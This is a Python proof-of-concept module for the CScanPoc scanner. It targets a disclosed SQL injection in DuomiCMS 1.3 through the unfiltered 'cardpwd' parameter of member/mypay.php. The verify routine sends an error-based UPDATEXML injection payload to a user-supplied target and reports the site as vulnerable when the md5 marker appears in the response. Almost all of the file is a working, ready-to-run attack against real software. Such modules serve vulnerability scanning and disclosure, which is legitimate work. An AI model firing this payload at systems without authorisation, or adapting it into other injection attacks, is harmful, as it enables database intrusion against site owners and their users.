# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'DuomiCMS_0003'  # 平台漏洞编号，留空
    name = '多米CMS最新版1.3版本注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-08-06'  # 漏洞公布时间
    desc = '''
        漏洞文件member/mypay.php(14-40行)
        此处的"cardpwd"变量没有进行过滤就以POST提交方式传入了数据库造成注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4007/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DuomiCMS'  # 漏洞应用名称
    product_version = '1.3版'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '847839f0-fe70-4097-9a59-095079a47937'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/member/mypay.php?dm=mypay'
            data = "cardpwd=-1' AND (UPDATEXML(1,CONCAT(0x7e,(md5(c)),0x7e),1)) and '1'='1"
            url = self.target + payload
            r = requests.post(url, data=data)

            if '4a8a08f09d37b73795649038408b5f33' in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
